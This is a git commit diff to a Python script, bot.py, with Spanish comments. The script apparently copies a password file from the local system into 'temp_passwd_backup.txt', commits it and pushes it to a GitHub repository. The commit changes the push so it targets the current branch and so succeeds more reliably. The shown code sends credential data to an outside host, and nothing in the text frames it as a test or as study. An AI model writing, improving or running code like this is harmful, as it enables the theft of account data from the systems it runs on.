bce37145e2a862b4d89abaa31c5bf4538b03cde1
handicap11 <158589346+handicap11@users.noreply.github.com>
2024-02-09 15:49:52 +0100

    Update bot.py

--- bot.py
+++ bot.py
@@ -28,10 +28,18 @@ def run():
     # Añade y sube el archivo al repositorio de GitHub
     subprocess.run(['git', 'add', 'temp_passwd_backup.txt'])
     subprocess.run(['git', 'commit', '-m', mensaje_commit])
+
+    # Añadir el control remoto, reemplaza 'main' con el nombre correcto de la rama principal
     subprocess.run(['git', 'remote', 'add', 'origin', f'https://github.com/{repo_nombre}.git'])
-    subprocess.run(['git', 'push', '-u', 'origin', 'main'])
+
+    # Obtener el nombre de la rama principal
+    branch_name = subprocess.check_output(['git', 'symbolic-ref', '--short', 'HEAD']).strip().decode('utf-8')
+
+    # Push al repositorio remoto
+    subprocess.run(['git', 'push', '-u', 'origin', branch_name])
 
     print(f'Archivo {ruta_passwd} copiado a GitHub en el repositorio {repo_nombre}/{archivo_en_repo}')
 
 # Llamamos a la función run()
 run()
+
